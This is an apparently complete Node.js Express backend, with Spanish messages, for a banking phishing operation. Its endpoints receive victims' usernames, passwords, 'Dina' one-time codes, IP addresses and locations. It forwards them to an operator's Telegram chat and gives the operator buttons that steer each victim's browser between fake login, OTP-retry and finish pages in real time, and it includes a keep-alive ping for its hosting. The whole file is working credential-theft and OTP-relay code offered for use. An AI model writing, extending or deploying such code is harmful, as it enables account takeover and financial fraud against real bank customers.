// 📦 Nuevo backend inspirado en 'express server avianca.js' adaptado al flujo descrito

const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!BOT_TOKEN || !CHAT_ID) {
  console.warn("[WARN] BOT_TOKEN o CHAT_ID no definidos.");
}

const redirections = new Map();

app.get('/', (_req, res) => {
  res.send({ ok: true, service: 'virtual-backend', hasEnv: !!(BOT_TOKEN && CHAT_ID) });
});

app.post('/virtualpersona', async (req, res) => {
  try {
    const { sessionId, user, pass, ip, country, city } = req.body;

    console.log('🔔 POST /virtualpersona recibido');
    console.log({ sessionId, user, pass, ip, country, city });

    if (!BOT_TOKEN || !CHAT_ID) {
      console.error("❌ BOT_TOKEN o CHAT_ID no definidos");
      return res.status(500).send({ ok: false, reason: "Env vars undefined" });
    }

    const mensaje = `
🟢 Nuevo Ingreso

👤 User: ${user}
🔒 Pass: ${pass}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    const reply_markup = {
      inline_keyboard: [[
        { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
        { text: "✅ Siguiente", callback_data: `go:opcion1.html|${sessionId}` }
      ]]
    };

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    console.log(`📡 Enviando a Telegram: ${url}`);

    await axios.post(url, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    console.log('✅ Mensaje enviado correctamente');
    res.send({ ok: true });
  } catch (error) {
    console.error('❌ ERROR EN /virtualpersona');
    if (error.response) {
      console.error('🔁 RESPONSE:', error.response.data);
    }
    if (error.request) {
      console.error('🔃 REQUEST:', error.request);
    }
    console.error('🧠 ERROR:', error.message);
    res.status(500).json({ ok: false, reason: error.message });
  }
});

// 🔁 Ruta para opcion1.html
app.post('/otp1', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟡 Ingreso OTP Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    const reply_markup = {
      inline_keyboard: [
        [
          { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
          { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` },
        ],
        [
          { text: "🔁 Nuevo OTP", callback_data: `go:opcion1.html|${sessionId}` },
          { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp1:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 🔁 Ruta para opcion2.html
app.post('/otp2', async (req, res) => {
  try {
    const { sessionId, user, pass, dina, ip, country, city } = req.body;

    const mensaje = `
🟠 Ingreso OTP new Dina

👤 User: ${user}
🔒 Pass: ${pass}
🔢 Dina: ${dina}
🌐 IP: ${ip} - ${city}, ${country}
🆔 sessionId: ${sessionId}
    `.trim();

    redirections.set(sessionId, null);

    const reply_markup = {
      inline_keyboard: [
        [
          { text: "❌ Error Logo", callback_data: `go:Virtual-Persona.html|${sessionId}` },
          { text: "⚠️ Error OTP", callback_data: `go:opcion2.html|${sessionId}` }
        ],
        [
          { text: "🔁 Nuevo OTP", callback_data: `go:opcion1.html|${sessionId}` },
          { text: "✅ Finalizar", callback_data: `go:finalizar.html|${sessionId}` }
        ]
      ]
    };

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: mensaje,
      reply_markup
    });

    res.send({ ok: true });
  } catch (error) {
    console.error('Error en /otp2:', error.message);
    res.status(500).send({ ok: false });
  }
});

// 📩 Webhook de Telegram para botones
app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
  try {
    const update = req.body;
    const { callback_query } = update;

    if (callback_query) {
      const [action, sessionId] = (callback_query.data || '').split('|');
      const route = action.replace('go:', '');

      if (sessionId) redirections.set(sessionId, route);

      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        callback_query_id: callback_query.id,
        text: `Redirigiendo cliente → ${route}`,
        show_alert: true
      });
    }
    res.sendStatus(200);
  } catch (err) {
    console.error("Error en webhook:", err);
    res.sendStatus(200);
  }
});

// 🔁 Polling desde loading.html
app.get('/instruction/:sessionId', (req, res) => {
  const sessionId = req.params.sessionId;
  const target = redirections.get(sessionId);

  if (target) {
    redirections.delete(sessionId);
    res.send({ redirect_to: target });
  } else {
    res.send({});
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Servidor activo en puerto ${PORT}`));

// ==== Auto-ping para mantener activo el backend y refrescar la propia URL cada 3 minutos ====
setInterval(async () => {
  try {
    const res = await fetch("https://servitrico1.onrender.com");
    const text = await res.text();
    console.log("🔁 Auto-ping realizado:", text);
  } catch (error) {
    console.error("❌ Error en auto-ping:", error.message);
  }
}, 180000); // 180000 ms = 3 minutos
